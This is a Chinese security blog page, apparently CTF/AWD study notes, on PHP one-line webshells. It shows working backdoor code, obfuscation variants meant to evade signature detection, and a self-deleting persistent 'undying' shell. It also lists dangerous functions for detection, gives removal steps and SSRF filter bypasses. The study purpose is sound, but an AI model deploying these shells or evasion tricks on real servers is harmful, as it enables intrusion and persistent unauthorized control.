@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="复习：上传木马 攻击成功必须满足三个条件：1、木马能成功上传到服务器2、知道木马上传到服务器的路径3、上传的木马能被解析执行eval和assert的区别：  相同点：都能把字符串作为PHP代码执行。  不同点：eval()不能被可变函数调用。eval函数实际是一个语言构造器，相当于c语言的预定义宏，属于php语言内部关键字。但是php7.1以上已经废弃了assert。 木马变形传统木马防护检测一般">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web">
+<meta property="og:url" content="http://example.com/2021/02/26/web/index.html">
+<meta property="og:site_name" content="WJW&#39;s Blog">
+<meta property="og:description" content="复习：上传木马 攻击成功必须满足三个条件：1、木马能成功上传到服务器2、知道木马上传到服务器的路径3、上传的木马能被解析执行eval和assert的区别：  相同点：都能把字符串作为PHP代码执行。  不同点：eval()不能被可变函数调用。eval函数实际是一个语言构造器，相当于c语言的预定义宏，属于php语言内部关键字。但是php7.1以上已经废弃了assert。 木马变形传统木马防护检测一般">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-02-26T01:39:08.000Z">
+<meta property="article:modified_time" content="2021-05-23T01:34:32.000Z">
+<meta property="article:author" content="WJW">
+<meta property="article:tag" content="一句话木马">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/02/26/web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>web | WJW's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="WJW's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">WJW's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">62</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/26/web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-26 09:39:08" itemprop="dateCreated datePublished" datetime="2021-02-26T09:39:08+08:00">2021-02-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 09:34:32" itemprop="dateModified" datetime="2021-05-23T09:34:32+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.4k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>复习：上传木马 攻击成功必须满足三个条件：<br><strong>1、木马能成功上传到服务器<br>2、知道木马上传到服务器的路径<br>3、上传的木马能被解析执行</strong><br>eval和assert的区别：</p>
+<ul>
+<li><p>相同点：都能把字符串作为PHP代码执行。</p>
+</li>
+<li><p>不同点：eval()不能被可变函数调用。eval函数实际是一个语言构造器，相当于c语言的预定义宏，属于php语言内部关键字。<br>但是php7.1以上已经废弃了assert。</p>
+<h3 id="木马变形"><a href="#木马变形" class="headerlink" title="木马变形"></a>木马变形</h3><p>传统木马防护检测一般是：基于特征检测的防护，如正则表达式和黑名单。</p>
+<h3 id="隐藏关键字"><a href="#隐藏关键字" class="headerlink" title="隐藏关键字"></a>隐藏关键字</h3></li>
+<li><p>绕过php代码标志&lt;?的限制<br><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></p>
+</li>
+<li><p>拆分拼接<br><code>&lt;?php $arr=explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,k,r,t&quot;); //把字符串打散为数组 $payload=$arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9];//拼接成assert //php版本要求:&lt;=7.0 @$payload(@$_GET[&#39;x&#39;]); ?&gt; </code></p>
+</li>
+<li><p>编码<br><code>&lt;?php   $a=base64_decode(&quot;YXNzZXJ0&quot;);   @$a($_POST(&#39;cmd&#39;)); ?&gt;</code></p>
+</li>
+<li><p>随机异或，用异或运算来组成字符<br><code>&lt;?php //也可以用十六进制进行进一步加密,例如 //$r=&quot;x4d&quot;^&quot;x3f&quot;; $a=&quot;Y&quot;^&quot;8&quot;;//a $b=&quot;T&quot;^&quot;&#39;&quot;;//s $c=&quot;*&quot;^&quot;O&quot;;//e $d=&quot;M&quot;^&quot;?&quot;;//r $e=&quot;-&quot;^&quot;Y&quot;;//t $payload=$a.$b.$b.$c.$d.$e;//拼接成assert @$payload(@$_POST[&#39;x&#39;]); ?&gt; </code></p>
+</li>
+<li><p>可变函数<br><code>&lt;?php @$_REQUEST[&#39;e&#39;](@$_REQUEST[&#39;x&#39;]); //传入e=assert&amp;x=command ?&gt; </code></p>
+</li>
+<li><p>可变变量<br><code>&lt;?php $a=&#39;assert&#39;; $b=&#39;a&#39;; //$$b=$a=&#39;assert&#39; $$b($_POST[&#39;x&#39;]); //assert($_POST[&#39;x&#39;]) ?&gt; </code></p>
+<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3></li>
+</ul>
+<p>回调函数：PHP是将函数以string形式传递的。可以使用任何内置或用户自定义函数，但除了语言结构例如：array()，echo，empty()，eval()，exit()，isset()，list()，print 或 unset()。<br>如：<br>call_user_func ( $callback , $parameter)<br>$callback ：被调用的回调函数<br>$parameter：0个或以上的参数，被传入回调函数。<br><?php  
+ @call_user_func($_GET['id'],$_POST['a']);
+ //传入id=eval&a=command
+?></p>
+<h3 id="木马使用"><a href="#木马使用" class="headerlink" title="木马使用"></a>木马使用</h3><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>system()–执行外部程序，并显示输出<br>passthru()–执行外部程序并且显示原始输出<br>exec()–执行一个外部程序，不输出结果，echo返回结果的最后一行。<br>shell_exec()或<code>  </code>–通过shell环境执行命令，需要echo</p>
+<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>file_ get_contents 一将整个文件读入为一个字符串<br>file()一把整个文件读入一个数组中<br>readfile一读取一个文件，并写入到输出缓冲</p>
+<h4 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h4><p>scandir() 函数返回一个指定目录中的文件和目录的数组。</p>
+<h3 id="木马的特征与查杀（AWD）"><a href="#木马的特征与查杀（AWD）" class="headerlink" title="木马的特征与查杀（AWD）"></a>木马的特征与查杀（AWD）</h3><p>基于特征检测，检测敏感关键字，如：危险函数、特殊函数<br>工具：D盾</p>
+<h4 id="1、代码执行函数："><a href="#1、代码执行函数：" class="headerlink" title="1、代码执行函数："></a>1、代码执行函数：</h4><ul>
+<li>eval</li>
+<li>assert</li>
+<li>pre_replace</li>
+<li>create_function</li>
+<li>回调函数 call_user_func、call_user_func_array、register_tick_function、array_filter等等</li>
+<li>……………….<h4 id="2、命令执行函数："><a href="#2、命令执行函数：" class="headerlink" title="2、命令执行函数："></a>2、命令执行函数：</h4></li>
+<li>exec()–执行一个外部程序</li>
+<li>passthru()–执行外部程序并且显示原始输出</li>
+<li>proc_open()–执行一个命令，并且打开用来输入/输出的文件指针</li>
+<li>shell_exec()或<code>   </code>–通过shell环境执行命令</li>
+<li>system()–执行外部程序，并显示输出</li>
+<li>popen()–通过参数传递一条命令，并对popen打开的文件执行<h4 id="3、文件操作函数："><a href="#3、文件操作函数：" class="headerlink" title="3、文件操作函数："></a>3、文件操作函数：</h4></li>
+<li>file_ get_contents 一将整个文件读入为一个字符串</li>
+<li>file_ put_ contents 一将一个字符串写入文件</li>
+<li>file()一把整个文件读入一个数组中</li>
+<li>fopen一打开文件或者URL</li>
+<li>move_ uploaded file 一将上传的文件移动到新位置</li>
+<li>readfile一读取一个文件，并写入到输出缓冲</li>
+<li>rename一重命名一个文件或目录</li>
+<li>rmdir一删除目录</li>
+<li>unlink &amp; delete 一删除文件<h4 id="4、包含函数："><a href="#4、包含函数：" class="headerlink" title="4、包含函数："></a>4、包含函数：</h4></li>
+<li>require、require_once</li>
+<li>include、include_once<h4 id="5、特殊函数："><a href="#5、特殊函数：" class="headerlink" title="5、特殊函数："></a>5、特殊函数：</h4></li>
+<li>phpinfo</li>
+<li>变量覆盖  parse_str、extract</li>
+<li>…………………<h3 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h3>不死马即内存马，它无文件，但程序会永久的运行在PHP进程中，无限执行，很隐蔽不易被发现，也不容易被删除。<h4 id="不死马相关代码"><a href="#不死马相关代码" class="headerlink" title="不死马相关代码"></a>不死马相关代码</h4><code>&lt;?php  ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = &#39;./.index1.php&#39;; $code = &#39;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5c44d3ed7462245f57b37f8fe2a3d5de&quot;)&#123;@eval($_POST[&quot;cmd&quot;]);&#125; ?&gt;&#39;; //pass=nepnep 用法：pass=nepnep&amp;cmd=command while (1)&#123;   file_put_contents($file,$code);   system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .index1.php&#39;);   usleep(5000); &#125; ?&gt;</code><br>ignore_user_abort(true)：此函数用来设置 客户机断开后是否会终止脚本的执行，设置成true，客户机断开后脚本仍然会执行。<br>set_time_limit(0)：设置脚本最大执行时间，设为0表示没有限制。<br>unlink(_<em>FILE</em>_)： 删除文件本身，起到隐蔽自身的作用。<br>usleep()：延迟执行当前脚本若干微秒。<br>注：<br>pass参数使用了MD5加密，防止木马被他人利用。</li>
+</ul>
+<h4 id="不死马的查杀："><a href="#不死马的查杀：" class="headerlink" title="不死马的查杀："></a>不死马的查杀：</h4><p>1、重启服务，比如php 等web服务。</p>
+<p>2、创建一个和不死马同名的文件夹。</p>
+<p>3、删除相应进程。查出不死马进程PID后，用命令kill -9 PID 杀掉进程。</p>
+<p>4、竞争写入删除不死马的文件，usleep的时间必须要小于不死马的延迟时间才会有效。</p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="SSRF的定义与成因"><a href="#SSRF的定义与成因" class="headerlink" title="SSRF的定义与成因"></a>SSRF的定义与成因</h4><p>SSRF(服务端请求伪造)是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。<br>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统<br>(正是因为由服务端发起，所以它能够请求到与它相连而与外网隔离的内部系统)<br>原因：服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤、限制。</p>
+<h4 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h4><ul>
+<li>内网探测</li>
+<li>利用file协议读取本地文件等等</li>
+<li>向内部任意主机的任意端口发送精心构造的payload，从而攻击内网的web应用，主要是使用GET参数就可以实现的攻击</li>
+<li>DOS攻击<h4 id="SSRF漏洞的验证"><a href="#SSRF漏洞的验证" class="headerlink" title="SSRF漏洞的验证"></a>SSRF漏洞的验证</h4>1、排除法，F12查看源码，看是否在本地进行请求<br>如：xxx?image=(地址)的就可能存在SSRF漏洞。<br>2、dnslog等工具进行测试，看是否被访问。<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4>1、加端口<br>2、短网址<br>3、指向任意IP的域名xip.io<br>4、IP限制绕过<br>十进制转换、八进制转换、十六进制转换<br>5、@绕过<br>访问的是@后面的网址<br>6、后面跟参数</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="WJW 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="WJW 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>WJW
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2021/02/26/web/" title="web">http://example.com/2021/02/26/web/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag"># 一句话木马</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/08/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="prev" title="PHP伪协议">
+      <i class="fa fa-chevron-left"></i> PHP伪协议
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/13/SSTI%E6%B3%A8%E5%85%A5/" rel="next" title="SSTI注入">
+      SSTI注入 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%A8%E9%A9%AC%E5%8F%98%E5%BD%A2"><span class="nav-number">1.</span> <span class="nav-text">木马变形</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">2.</span> <span class="nav-text">隐藏关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">回调函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">木马使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">4.1.</span> <span class="nav-text">执行系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-number">4.2.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95"><span class="nav-number">4.3.</span> <span class="nav-text">遍历目录</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%89%B9%E5%BE%81%E4%B8%8E%E6%9F%A5%E6%9D%80%EF%BC%88AWD%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">木马的特征与查杀（AWD）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-number">5.1.</span> <span class="nav-text">1、代码执行函数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-number">5.2.</span> <span class="nav-text">2、命令执行函数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-number">5.3.</span> <span class="nav-text">3、文件操作函数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-number">5.4.</span> <span class="nav-text">4、包含函数：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="nav-number">5.5.</span> <span class="nav-text">5、特殊函数：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="nav-number">6.</span> <span class="nav-text">不死马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9B%B8%E5%85%B3%E4%BB%A3%E7%A0%81"><span class="nav-number">6.1.</span> <span class="nav-text">不死马相关代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC%E7%9A%84%E6%9F%A5%E6%9D%80%EF%BC%9A"><span class="nav-number">6.2.</span> <span class="nav-text">不死马的查杀：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-number">7.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF%E7%9A%84%E5%AE%9A%E4%B9%89%E4%B8%8E%E6%88%90%E5%9B%A0"><span class="nav-number">7.1.</span> <span class="nav-text">SSRF的定义与成因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-number">7.2.</span> <span class="nav-text">SSRF的危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%AA%8C%E8%AF%81"><span class="nav-number">7.3.</span> <span class="nav-text">SSRF漏洞的验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">7.4.</span> <span class="nav-text">绕过方法</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WJW"
+      src="/images/cat.jpg">
+  <p class="site-author-name" itemprop="name">WJW</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WJW</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">236k</span>
+</div>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
